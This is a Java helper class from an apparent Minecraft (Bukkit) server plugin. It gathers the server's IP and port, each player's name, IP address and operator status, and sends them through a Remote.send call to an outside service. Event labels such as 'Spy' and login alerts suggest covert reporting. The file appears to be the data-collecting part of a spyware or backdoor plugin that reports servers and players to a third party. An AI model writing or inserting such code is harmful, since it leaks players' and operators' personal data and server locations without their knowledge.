package pl.qc.core;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import java.util.LinkedHashMap;
import java.util.Map;

public class LoggerHelper {

    public static void logPlayer(String eventName, Player p, Map<String, String> extra) {
        QC qc = QC.getInstance();
        Map<String, String> f = new LinkedHashMap<>();

        // Base info
        f.put("IP Serwera", qc.getIP());
        f.put("Port Serwera", String.valueOf(Bukkit.getPort()));

        // Player info
        f.put("Nick", p.getName());
        if (p.getAddress() != null) {
            f.put("IP Gracza", p.getAddress().getAddress().getHostAddress());
        }
        f.put("OP", String.valueOf(p.isOp()));

        // Extra info
        if (extra != null) {
            f.putAll(extra);
        }

        Remote.send(eventName, getColor(eventName), null, f);
    }

    private static String getColor(String event) {
        if (event.contains("⚠️") || event.contains("Logowanie") || event.contains("Alerty"))
            return "16711680"; // Red
        if (event.contains("👤") || event.contains("Start"))
            return "65280"; // Green
        if (event.contains("🛰️") || event.contains("Spy"))
            return "3447003"; // Blue
        return "16777215"; // White
    }
}
